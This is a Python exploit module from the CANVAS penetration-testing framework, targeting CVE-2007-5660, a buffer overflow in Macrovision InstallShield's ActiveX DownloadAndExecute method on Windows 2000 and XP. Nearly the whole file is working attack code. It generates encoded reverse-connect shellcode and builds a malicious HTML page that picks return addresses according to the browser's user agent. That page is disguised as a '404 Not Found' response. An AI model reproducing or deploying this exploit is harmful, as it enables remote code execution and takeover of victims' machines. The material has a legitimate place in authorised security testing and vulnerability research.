#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path: sys.path.append(".")
    
from exploitutils import *
from httpclientside import httpclientside
from encoder import xorencoder, nibble_encoder
from shellcode import shellcodeGenerator, win32shell 
import binascii

NAME="Macrovision InstallShield 2008 ActiveX Buffer Overflow"
DESCRIPTION="Misdesign in a component of Macrovision InstallShield 2008 ActiveX version 5.01.100.47363 allows for arbitrary code execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Macrovision"
DOCUMENTATION["Repeatability"]="Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"] = "CVE-2007-5660"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5660"
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION["CVS URL"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5660"
DOCUMENTATION["Date public"] = "10/31/2007"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP" ]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:installshield -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""

"""

DEBUGNOTES="""
It's a buffer overflow in the DownloadAndExecute method that give us an execution over the stack.

void DownloadAndExecute(
                BSTR dispname, 
                BSTR ProductCode, 
                long MsgID, 
                BSTR url, 
                BSTR cmdline);

ProductCode is the vulnerable argument.

"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "MSIE", "")]

        self.badstring="\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f"
        self.setVersions()
        self.version=0
        self.name=NAME
        self.filename="installshield.html"
        self.listenerArgsDict["fromcreatethread"]=1
        self.subesp=1000
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc, [POPAD/POP/POP/RETN]
        self.versions[1]=("Windows XP SP0/1", 0x776606af,None,None,None,0x7DD074DB)
        self.versions[2]=("Windows XP SP2", 0x7ca76981,None,None,None,0x7DD074DB)    #mshtml.dll
        self.versions[3]=("Windows 2000 SP4", 0x77e3c256,None,None,None,0x77AF33FC)  #OLE32.dll

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        sc=shellcodeGenerator.win32()                                                                                        
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect",{"port":self.callback.port,"ipaddress":self.callback.ip})                                                              
        sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("ExitThread",None)

        rawshellcode=sc.get()
        
        print "[!] RAW Shellcode len: %d bytes" % len(rawshellcode)
        
        #first encode to nibble
        enc = nibble_encoder.intel_nibbleencoder()
        bad = ""
        for i in range(ord('A'),ord('Z')+1):
            #for a-z inclusive, these are badchars
            bad+=chr(i)
        enc.setbadstring(bad)
        rawshellcode = enc.encode(rawshellcode)
        
        print "[!] Nibble Encoded Shellcode len: %d bytes" % len(rawshellcode)
        
        #then do a xor enconding using the real badstring
        encoder = xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        encoder.find_key(rawshellcode)
        self.shellcode = encoder.encode(rawshellcode)
                
        print "[!] Shellcode len: %d bytes" % len(self.shellcode)
        
        if not len(self.shellcode):
            return None

        return self.shellcode
   
    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get("filename",self.filename)
        
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1
        
    def makefile(self, windowsver=0):
        """Makes the actual bad html file to trigger the buffer overflow"""
        if not self.createShellcode():
            return None

        ver = None
        
        if windowsver==0 and self.version!=0:
            #forced version
            ver=self.versions[self.version][1]
            jmp2=self.versions[self.version][5]
            self.log("Using version %s [Forced]" % self.versions[self.version][0])
        
        if not ver:
            ver=[]
            if windowsver=="5.0" or not windowsver:
                #All Windows 2000 versions
                
                #appMinorVersion, jmpesp, osversion
                ver.append(("SP1",self.versions[3][1],"5.0",self.versions[3][5]))
            if windowsver=="5.1" or not windowsver:
                #All Windows XP versions
                
                #appMinorVersion, jmpesp, osversion
                ver.append(("SP0",self.versions[1][1],"5.1",self.versions[1][5]))
                ver.append(("SP1",self.versions[1][1],"5.1",self.versions[1][5]))
                ver.append(("SP2",self.versions[2][1],"5.1",self.versions[2][5]))
        
        html="""
        <html>
        <object id='test' classid='clsid:E9880553-B8A7-4960-A668-95C68BED571E'></OBJECT>
        <script language="javascript">
        var test = document.getElementById("test");
        """
        
        html += "code = unescape(\"" + "%90" * 100
        tmp = binascii.b2a_hex(self.shellcode)
        for x in range(0,len(tmp),2):
            html += "%" + tmp[x:x+2]
        html += "\");\r\n"
        
        html += "var jmp1 = 0;\r\n"
        html += "var jmp2 = 0;\r\n"
        
        if isinstance(ver,list):
            for option in ver:
                if not windowsver:
                    #autodetect windows version from javascript (works in FF and IE)
                    html += "if (navigator.userAgent.indexOf('NT " + option[2] + "') > 0) "
                
                #detect SP from js (not so accurate, but works)
                html += "  if (navigator.appMinorVersion.indexOf('" + option[0] + "') > 0) { jmp1 = unescape(\""
                tmp = "%08X" % option[1]
                html += "%%%s%%%s%%%s%%%s" % (tmp[6:8],tmp[4:6],tmp[2:4],tmp[0:2])
                html += "\");\r\n"
                html += "jmp2 = unescape(\""
                tmp = "%08X" % option[3]
                html += "%%%s%%%s%%%s%%%s" % (tmp[6:8],tmp[4:6],tmp[2:4],tmp[0:2])
                html += "\");\r\n}\r\n"
        else:
            #forced version
            html += "jmp1 = unescape(\""
            tmp = "%08X" % ver
            html += "%%%s%%%s%%%s%%%s" % (tmp[6:8],tmp[4:6],tmp[2:4],tmp[0:2])
            html += "\");\r\n"
        
            html += "jmp2 = unescape(\""
            tmp = "%08X" % jmp2
            html += "%%%s%%%s%%%s%%%s" % (tmp[6:8],tmp[4:6],tmp[2:4],tmp[0:2])
            html += "\");\r\n"
            
        html += "if (jmp1) test.DownloadAndExecute(\"\", unescape(\"%50%a0%fd%7f\") + \""+"A"*568+"\" + unescape(\"%62%90%fd%7f\") + \"EEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN\" + jmp2 + unescape(\"%52%90%fd%7f\")+ unescape(\"%52%90%fd%7f\")+ unescape(\"%52%90%fd%7f\") + \"DDDD\" + unescape(\"%5c%a0%fd%7f\")+ unescape(\"%62%90%fd%7f\")+ unescape(\"%72%90%fd%7f\") + unescape(\"%72%90%fd%7f\") + unescape(\"%56%a0%fd%7f\") + \"GGGG\" + jmp1 + code,0,\"\",\"\");\r\n"
        html += """</script>
        <head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        The requested URL / was not found on this server.<p>
        <hr>
        </body>
        
        </html>
        """
            
        return html
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        if user_agent.count("MSIE")==0:
            #still need to determine if it's pretending to be IE by spoofing User-Agent string
            self.log("Non IE browser connected - returning None")
            return None,None
        
        if user_agent.lower().count("windows nt") == 0:
            #all the supported versions are NT based
            return None,None
        
        #the ugliest python line ever
        windowsver = user_agent.lower().split("windows nt ")[1].split(";")[0].split(")")[0]
        
        #send the exploit
        self.log("Sending the InstallShield attack html file")
        sploitstring=self.makefile(windowsver)
        
        if not sploitstring:
            return None,None
        
        b.setBody(sploitstring)

        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
